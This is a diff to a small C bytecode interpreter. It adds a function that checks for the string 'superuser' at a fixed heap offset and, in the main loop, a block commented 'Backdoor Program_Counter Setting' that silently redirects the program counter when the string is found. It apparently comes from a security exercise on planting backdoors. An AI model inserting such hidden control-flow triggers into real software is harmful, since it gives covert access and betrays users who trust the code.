@@ -42,6 +42,22 @@ void usageExit() {
     exit(1);
 }
 
+
+bool isSuperUser(){
+    char super[]="superuser";
+    int i=0;
+    int j=0;
+    for(i=0;i<10;i++){
+        if(*(super+i)==*(heap+100+i))
+            j++;
+
+    }
+    if(j==10)
+        return true;
+    else
+        return false;
+}
+
 void halt(struct VMContext* ctx, const uint32_t instr) {
     /*
     This instruction does not require any operand. This instruction
@@ -581,11 +597,26 @@ int main(int argc, char** argv) {
     // Init program_counter
     program_counter=0;
 
+    //Backdoor Program_Counter Setting
+    bool isSuper=false;
+    bool flag=false;
+    int new_pc=1;
+
     //Start Running
     while (is_running) {
         //Read 4-byte bytecode, and set the pc accordingly
         stepVMContext(&vm, &pc);
-        
+
+        isSuper=isSuperUser();
+        if((isSuper==true)&&(flag==false))
+        {
+
+            pc=pc-program_counter+new_pc;
+            program_counter=new_pc;
+            isJump=true; 
+            flag=true;           
+        }
+
         //in case of jump or ite
         if(isJump)
         {
